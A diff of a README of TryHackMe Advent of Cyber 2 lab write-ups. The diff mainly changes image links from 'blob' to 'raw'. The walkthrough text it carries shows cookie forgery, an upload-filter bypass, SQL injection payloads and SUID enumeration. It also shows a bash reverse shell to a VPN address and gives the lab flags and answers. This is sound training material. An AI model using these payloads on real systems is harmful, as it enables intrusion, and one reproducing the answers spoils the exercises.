@@ -1,7 +1,7 @@
 ![Advent of Cyber 2 Banner](https://assets.tryhackme.com/room-banners/adventofcyber.png)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Advent_of_Cyber_2_2020_Cover.png" alt="Advent of Cyber 2 2020 Cover">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Advent_of_Cyber_2_2020_Cover.png" alt="Advent of Cyber 2 2020 Cover">
 </p>
 
 # Advent of Cyber 2 [2020]
@@ -45,7 +45,7 @@ Register for an account, and then login.
 
 After registering for an account, we see we cannot activate any services. So we need to open the developer tools to view our current cookie.
 
-![Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Cookie.png)
+![Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Cookie.png)
 
    ><details><summary>Click for answer</summary>auth</details>
 
@@ -59,7 +59,7 @@ Judging from the characters, this might be hex encoded. Inputting the string in 
 
    If we use CyberChef to decode the string from `hex` it appears to be a JSON formatted string.
    
-   ![Decoded Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Cookie_Decoded.png)
+   ![Decoded Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Cookie_Decoded.png)
 
    ><details><summary>Click for answer</summary>JSON</details>
 
@@ -69,7 +69,7 @@ Figure out how to bypass the authentication.
 
    To log in as Santa, we need to change our cookie value. From the JSON formatted string we can see we need to substitute our username for `santa`. Now can encode this string back to hexadecimal with CyberChef.
    
-   ![New Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Santa_Cookie.png)
+   ![New Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Santa_Cookie.png)
 
    ><details><summary>Click for answer</summary>7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d</details>
 
@@ -79,7 +79,7 @@ Now that you are the santa user, you can re-activate the assembly line!
 
    After replacing our cookie with this new value and reloading the page, we see we can now activate the services. After activating them all, we get the flag.
    
-   ![Restored](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Restored.png)
+   ![Restored](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Restored.png)
 
    ><details><summary>Click for answer</summary>THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}</details>
 
@@ -93,7 +93,7 @@ ID number: `ODIzODI5MTNiYmYw`
 
    We need to login with the ID number given. We will use `GET` parameters to send extra information to the browser and the parameter is `id` with value `ODIzODI5MTNiYmYw`.
    
-   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Login_Page.png)
+   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Login_Page.png)
 
    ><details><summary>Click for answer</summary>?id=ODIzODI5MTNiYmYw</details>
 
@@ -101,7 +101,7 @@ ID number: `ODIzODI5MTNiYmYw`
 
    On the next page we can see an upload prompt. Apparently, it will accept images.
    
-   ![Logged In](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Logged_In.png)
+   ![Logged In](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Logged_In.png)
 
    ><details><summary>Click for answer</summary>Image</details>
 
@@ -111,9 +111,9 @@ Bypass the filter and upload a reverse shell.
 
    To bypass the filter, we can use what we learned and try the `.jpg.php` extension. If configured improperly, it will think the file is an image. But first we need to modify our reverse shell which can be copied from `/usr/share/webshells/php-reverse-shell.php`. We need to add our ip address (tun0, since we are connected through a VPN) and a port that is available.
    
-   ![PHP Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_PHP_Shell.png)
+   ![PHP Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_PHP_Shell.png)
    
-   ![Upload File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Upload_File.png)
+   ![Upload File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Upload_File.png)
    
    This seems to have worked. To find where the file is located on the server we can use `DirSearch` to enumerate the directories using:
    
@@ -121,11 +121,11 @@ Bypass the filter and upload a reverse shell.
    dirsearch -u 10.10.55.59 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
    ```
    
-   ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Directory.png)
+   ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Directory.png)
    
    Navigating to `uploads`, we can indeed see the file we just uploaded.
    
-   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_File.png)
+   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_File.png)
 
    ><details><summary>Click for answer</summary>/uploads/</details>
 
@@ -139,11 +139,11 @@ Bypass the filter and upload a reverse shell.
    
    Now we can click on the file on the server and see if we get any incoming connections to our listener.
    
-   ![Netcat ssh](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_SSH.png)
+   ![Netcat ssh](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_SSH.png)
    
    Now we can view the flag on the system with `cat /var/www/flag.txt`.
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Flag.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</details>
 
@@ -155,23 +155,23 @@ In this task we will be using BurpSuite to brute force the logging on a website 
 
    After navigating to the login page, we activate the proxy for Firefox. We then supply some arbitrary credentials and hit the login button. Our request is intercepted by BurpSuite and Firefox is waiting.
    
-   ![Intercept](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Intercept.png)
+   ![Intercept](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Intercept.png)
    
    Now we send this request to intruder, select `Cluster bomb` as attack type and select the `username` and `password` values as our positions.
    
-   ![Positions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Positions.png)
+   ![Positions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Positions.png)
    
    Next we need to add all the entries we want to try for both positions in the payload tab.
    
-   ![Payloads](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Payloads.png)
+   ![Payloads](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Payloads.png)
    
    Now we run the attack and wait for the results to come in. The results with a different length or status than the rest would indicate to be a working combination.
    
-   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Credentials.png)
+   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Credentials.png)
    
    After logging in to the website with the found credentials, we can find the flag as well.
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Flag.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{885ffab980e049847516f9d8fe99ad1a}</details>
 
@@ -201,7 +201,7 @@ In this task we will be using `gobuster` or `dirsearch` to find hidden directori
    
    Navigating to this directory we can find the file present.
   
-  ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Directory.png)
+  ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Directory.png)
 
    ><details><summary>Click for answer</summary>site-log.php</details>
 
@@ -215,15 +215,15 @@ In this task we will be using `gobuster` or `dirsearch` to find hidden directori
    
    The `--hw o` argument filters out any responses which are empty. `--hc 404` or similar will probably not work as the api still returns information, it is just empty.
    
-   ![Api Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Api_Parameter.png)
+   ![Api Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Api_Parameter.png)
    
    Now we can look for the correct log with the date we found. Either use `curl` to retrieve the information,
    
-   ![Curl Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Curl.png)
+   ![Curl Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Curl.png)
    
    or navigate to the page in the browser.
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Flag.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{D4t3_AP1}</details>
 
@@ -252,7 +252,7 @@ Some usefull resources:
 
    Logging into the application can be done by supplying the `' or 1=1;--` command.
    
-   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_Panel.png)
+   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_Panel.png)
    
    Here we can use SQLi to get results from the webpage itself by using the following command:
    
@@ -260,11 +260,11 @@ Some usefull resources:
    ' union select 1,2;--
    ```
    
-   ![Column Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_Column_Numbers.png)
+   ![Column Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_Column_Numbers.png)
    
    However, for this task we will use `sqlmap` to find more information about the database. First we create a request file for `sqlmap` to use with BurpSuite. Enable the proxy, enter something arbitrary into the search field and click search. Now we intercepted the request in BurpSuite, we can save it as an item in a folder of our choice.
    
-   ![Save Item](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_Save_Item.png)
+   ![Save Item](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_Save_Item.png)
    
    Now we use `sqlmap` to dump all information of the database.
    
@@ -277,11 +277,11 @@ Some usefull resources:
    -dbms                   -> This specifies the database type, also from our note
    ```
    
-   ![Sqlmap Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Command.png)
+   ![Sqlmap Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Command.png)
    
    In the results, we can see the table entries.
    
-   ![Sqlmap Table](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Table.png)
+   ![Sqlmap Table](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Table.png)
 
    ><details><summary>Click for answer</summary>22</details>
 
@@ -295,7 +295,7 @@ Some usefull resources:
 
    `sqlmap` also found a hidden table. This seems to contain a flag.
    
-   ![Sqlmap Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Flag.png)
+   ![Sqlmap Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Flag.png)
 
    ><details><summary>Click for answer</summary>thmfox{All_I_Want_for_Christmas_Is_You}</details>
 
@@ -303,7 +303,7 @@ Some usefull resources:
 
    Another table `sqlmap` found, `users`, contains the credentials for the admin user.
    
-   ![Sqlmap Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Credentials.png)
+   ![Sqlmap Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Credentials.png)
 
    ><details><summary>Click for answer</summary>EhCNSWzzFP6sc7gB</details>
 
@@ -313,7 +313,7 @@ In this task we will be using XSS exploiting to cause un-intended functioning on
 
 Extra resources:
 
-- [OWASP Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md)
+- [OWASP Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/raw/master/cheatsheets/Input_Validation_Cheat_Sheet.md)
 - [Guide about XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 - [Payload List](https://github.com/payloadbox/xss-payload-list)
 
@@ -327,7 +327,7 @@ Extra resources:
 
    When looking through the source code for the webpage, we find the name of the comment field as `q`.
    
-   ![XSS Field](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2006/Whish_XSS_Field.png)
+   ![XSS Field](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2006/Whish_XSS_Field.png)
 
    ><details><summary>Click for answer</summary>q</details>
 
@@ -335,7 +335,7 @@ Extra resources:
 
    After opening ZAP and entering the url of the website, we can a result for the number of XSS exploits present.
    
-   ![OWASP ZAP Exploits](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2006/Whish_XSS_Exploits.png)
+   ![OWASP ZAP Exploits](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2006/Whish_XSS_Exploits.png)
 
    ><details><summary>Click for answer</summary>2</details>
 
@@ -355,7 +355,7 @@ In this task we will be investigating some network traffic to find some interest
 
    After opening the pcap file in Wireshark we can filter the traffic on the `ICMP` protocol. Here we can see the source ip for the machine initiating the ping.
    
-   ![Wireshark ICMP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_ICMP.png)
+   ![Wireshark ICMP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_ICMP.png)
 
    ><details><summary>Click for answer</summary>10.11.3.2</details>
 
@@ -369,7 +369,7 @@ In this task we will be investigating some network traffic to find some interest
 
    Using the above filter as well as `&& ip.src == 10.10.67.199` we can narrow down the the traffic even more.
    
-   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_GET_Article.png)
+   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_GET_Article.png)
 
    ><details><summary>Click for answer</summary>reindeer-of-the-week</details>
 
@@ -377,7 +377,7 @@ In this task we will be investigating some network traffic to find some interest
 
    Here we can filter on FTP traffic containing something related to a password. Such as `pass`.
    
-   ![Wireshark FTP Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_FTP.png)
+   ![Wireshark FTP Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_FTP.png)
 
    ><details><summary>Click for answer</summary>plaintext_password_fiasco</details>
 
@@ -385,7 +385,7 @@ In this task we will be investigating some network traffic to find some interest
 
    If we remove all filters we can see the first entry being an encrypted SSH connection.
    
-   ![Wireshark SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_SSH.png)
+   ![Wireshark SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_SSH.png)
 
    ><details><summary>Click for answer</summary>SSH</details>
 
@@ -393,11 +393,11 @@ In this task we will be investigating some network traffic to find some interest
 
    To find any files we can filter on any plain text protocols such as `http`, `dns`, or `telnet`. Looks like there might be a list on `http` traffic. Lets save it to our machine.
    
-   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_HTTP.png)
+   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_HTTP.png)
    
    Now we can extract the archive and read the file.
    
-   ![Wireshark File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_File.png)
+   ![Wireshark File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_File.png)
 
    ><details><summary>Click for answer</summary>Rubber ducky</details>
 
@@ -419,7 +419,7 @@ In this task we will be using `nmap` to find more information on the target mach
    sudo nmap -sS -sV 10.10.77.254
    ```
    
-   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_1.png)
+   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_1.png)
 
    ><details><summary>Click for answer</summary>80,2222,3389</details>
 
@@ -433,7 +433,7 @@ In this task we will be using `nmap` to find more information on the target mach
 
    For this we can use the `--script=http-title` argument
    
-   ![Nmap Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Script.png)
+   ![Nmap Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Script.png)
 
    ><details><summary>Click for answer</summary>blog</details>
 
@@ -441,7 +441,7 @@ In this task we will be using `nmap` to find more information on the target mach
 
    The `-A` or `-sC` argument can be used to let nmap execute several default scripts. Doing so gives some more information.
    
-   ![Nmap Scipts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Scripts.png)
+   ![Nmap Scipts](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Scripts.png)
 
 
 ### [Day 9] [Anyone can be Santa!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2009)
@@ -458,7 +458,7 @@ In this task we will be using `nmap` to find more information on the target mach
    
    Then we can try logging is as user anonymous. Looks like we can indeed log in this way. Using `ls -lh` we can see the available directories.
    
-   ![FTP Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_FTP_Directory.png)
+   ![FTP Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_FTP_Directory.png)
 
    ><details><summary>Click for answer</summary>public</details>
 
@@ -466,7 +466,7 @@ In this task we will be using `nmap` to find more information on the target mach
 
    Navigating into this directory we can see two files. One of which is probably the script that gets executed. Lets download it for the next question using: `get backup.sh`.
    
-   ![FTP Get](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_FTP_Get.png)
+   ![FTP Get](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_FTP_Get.png)
 
    ><details><summary>Click for answer</summary>backup.sh</details>
 
@@ -474,19 +474,19 @@ In this task we will be using `nmap` to find more information on the target mach
 
    Using the same command as previously `get shoppinglist.txt` we can download the shopping list and open its content.
    
-   ![Santa Movie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Movie.png)
+   ![Santa Movie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Movie.png)
 
    ><details><summary>Click for answer</summary>The Polar Express</details>
 
 4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!
 
-   First we need to add our malicious payload to the script. From the [Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
+   First we need to add our malicious payload to the script. From the [Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
    
    ```cmd
    bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
    ```
    
-   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Script.png)
+   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Script.png)
    
    Now we can upload the script back to the server with `put backup.sh`. Then we must open up a listener on the correct port and wait for the script to execute on the server.
    
@@ -494,11 +494,11 @@ In this task we will be using `nmap` to find more information on the target mach
    nc -nlvp 1337
    ```
    
-   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Reverse_Shell.png)
+   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Reverse_Shell.png)
    
    As soon as we have our shell, we can navigate to the flag and view its contents.
    
-   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Flag.png)
+   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{even_you_can_be_santa}</details>
 
@@ -516,7 +516,7 @@ In this task we will be exploiting a vulnerability in the Samba file sharing pro
    
    Under the users section we get a list of the available users on the shares.
    
-   ![Samba Users](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Users.png)
+   ![Samba Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Users.png)
 
    ><details><summary>Click for answer</summary>3</details>
 
@@ -524,7 +524,7 @@ In this task we will be exploiting a vulnerability in the Samba file sharing pro
 
    We can use the results from the previous question to get the shares available. This is located in the Share Enumeration section.
    
-   ![Samba Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Enumeration.png)
+   ![Samba Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Enumeration.png)
    
    Another method we can use is via the `smbclient` command with the following arguments:
    
@@ -540,7 +540,7 @@ In this task we will be exploiting a vulnerability in the Samba file sharing pro
 
    In the session check section we can see the server allows logging in with empty username and password.
    
-   ![Samba Session Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Credentials.png)
+   ![Samba Session Check](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Credentials.png)
    
    From the enumeration section it looks like the santa share was accessible without a password.
    
@@ -550,7 +550,7 @@ In this task we will be exploiting a vulnerability in the Samba file sharing pro
    smbclient //10.10.111.166/tbfc-santa
    ```
    
-   ![Samba Share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Share.png)
+   ![Samba Share](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Share.png)
 
    ><details><summary>Click for answer</summary>tbfc-santa</details>
 
@@ -566,11 +566,11 @@ In this task we will be exploiting a vulnerability in the Samba file sharing pro
    get note_from_mcskidy.txt
    ```
    
-   ![Samba File Get](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_File_Get.png)
+   ![Samba File Get](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_File_Get.png)
    
    After viewing the file, it looks like it is related to the folder found in the same share.
    
-   ![Samba File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_File.png)
+   ![Samba File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_File.png)
 
    ><details><summary>Click for answer</summary>jingle-tunes</details>
 
@@ -584,7 +584,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
 - [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
 - [payatu](https://payatu.com/guide-linux-privilege-escalation)
-- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)
 
 **Machine IP:** `10.10.119.248`
 **SSH Username:** `cmnatic`
@@ -606,7 +606,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    After a quick Nmap scan, we can see the ssh service is indeed open op port 22.
    
-   ![Rogue Gnome Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_Nmap.png)
+   ![Rogue Gnome Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_Nmap.png)
    
    So we can ssh into the machine we the supplied credentials with the following command:
    
@@ -614,11 +614,11 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
    ssh cmnatic@10.10.119.248
    ```
    
-   ![Rogue Gnome SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_SSH.png)
+   ![Rogue Gnome SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_SSH.png)
    
    After a quick check with `echo $0`, we can see that our shell is already `bash`, so there is no need for us to make it interactive.
    
-   ![Gnome Shell Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_Shell_Type.png)
+   ![Gnome Shell Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_Shell_Type.png)
    
    As per the instructions we are looking for any binary that has its SUID bit set. So we executed the following command on the machine:
    
@@ -626,7 +626,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
    find / -perm -4000 2>/dev/null
    ```
    
-   ![Gnome SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_SUID.png)
+   ![Gnome SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_SUID.png)
    
    Using `GTFOBins` we can find out which of these binaries can be used for privelege escalation. Looks like `bash` is an intersting candidate. Unfortunately, I made some mistakes with the command, so it didn't work for me at first. This threw me of a little and sent me in the wrong direction as I tried to upload the `LinEnum.sh` script to the machine and execute it. This also didn't give anything. But I will list the steps I took as a PoC
    
@@ -646,11 +646,11 @@ In this task we will be using MetaSploit to get access to our target machine.
    nmap -sV 10.10.1.196 -Pn
    ```
    
-   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Nmap.png)
+   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Nmap.png)
    
    Navigating to the webserver, we can find the version of the server.
    
-   ![Server Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Server_Version.png)
+   ![Server Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Server_Version.png)
 
    ><details><summary>Click for answer</summary>9.0.17</details>
 
@@ -665,7 +665,7 @@ In this task we will be using MetaSploit to get access to our target machine.
 
    Her we can find which CVE we can exploit.
    
